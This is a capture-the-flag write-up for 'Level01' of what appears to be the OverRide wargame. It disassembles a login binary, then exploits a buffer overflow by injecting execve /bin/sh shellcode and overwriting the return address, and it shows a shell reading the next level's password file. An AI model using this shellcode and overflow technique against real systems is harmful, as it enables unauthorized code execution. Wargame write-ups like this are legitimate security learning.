# Level01

we start by disass the main function and we found this program after setup the stack print

> "\***\*\*\*\*** ADMIN LOGIN PROMPT \***\*\*\*\***"

and then ask the user to insert the username

> 0x80486df: "Enter Username: "

when the user insert the username they pass it to a function call `verify_user_name` to verify the username lets disass this function

```c
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:	push   ebp
   0x08048465 <+1>:	mov    ebp,esp
   0x08048467 <+3>:	push   edi
   0x08048468 <+4>:	push   esi
   0x08048469 <+5>:	sub    esp,0x10
   0x0804846c <+8>:	mov    DWORD PTR [esp],0x8048690 // "verifying username....\n"
   0x08048473 <+15>:	call   0x8048380 <puts@plt>
   0x08048478 <+20>:	mov    edx,0x804a040 // <a_user_name>:	 "" the value that you insert as usernam
   0x0804847d <+25>:	mov    eax,0x80486a8 // "dat_wil"
   0x08048482 <+30>:	mov    ecx,0x7
   0x08048487 <+35>:	mov    esi,edx
   0x08048489 <+37>:	mov    edi,eax
   0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804848d <+41>:	seta   dl
   0x08048490 <+44>:	setb   al
   0x08048493 <+47>:	mov    ecx,edx
   0x08048495 <+49>:	sub    cl,al
   0x08048497 <+51>:	mov    eax,ecx
   0x08048499 <+53>:	movsx  eax,al
   0x0804849c <+56>:	add    esp,0x10
   0x0804849f <+59>:	pop    esi
   0x080484a0 <+60>:	pop    edi
   0x080484a1 <+61>:	pop    ebp
   0x080484a2 <+62>:	ret
End of assembler dump.
```

in this part they impliment a loop size ecx = 0x7 check if the username == "dat_wil"

if not they print 'nope, incorrect username...' and leave

else they check the password function `verify_user_pass` lets disass this func:

```c
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:	push   ebp
   0x080484a4 <+1>:	mov    ebp,esp
   0x080484a6 <+3>:	push   edi
   0x080484a7 <+4>:	push   esi
   0x080484a8 <+5>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080484ab <+8>:	mov    edx,eax
   0x080484ad <+10>:	mov    eax,0x80486b0
   0x080484b2 <+15>:	mov    ecx,0x5
   0x080484b7 <+20>:	mov    esi,edx
   0x080484b9 <+22>:	mov    edi,eax
   0x080484bb <+24>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080484bd <+26>:	seta   dl
   0x080484c0 <+29>:	setb   al
   0x080484c3 <+32>:	mov    ecx,edx
   0x080484c5 <+34>:	sub    cl,al
   0x080484c7 <+36>:	mov    eax,ecx
   0x080484c9 <+38>:	movsx  eax,al
   0x080484cc <+41>:	pop    esi
   0x080484cd <+42>:	pop    edi
   0x080484ce <+43>:	pop    ebp
   0x080484cf <+44>:	ret
End of assembler dump.
```

also in this part they check if the password equal to "admin" but even we insert this value we can't get the flag but we notice that the function fgets in `verify_user_name` read _256_ characters and in the second function `verify_user_pass` read _100_ characters when we give it more we got a **Segmentation fault (core dumped)**

lets try to add a shellcode in the first buffer and lets call it in the second one

we calculate the offset and we found it **75** i used [this Link](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)

```python
python -c "print 'dat_will' + '\x90' * 128 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'" > A

python -c "print 'B' * 80 + '\xc0\xa0\x04\x08' + 'B' * 100" > B
```

and we got the flag

```c
level01@OverRide:~$ (cat A; cat B -)| ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
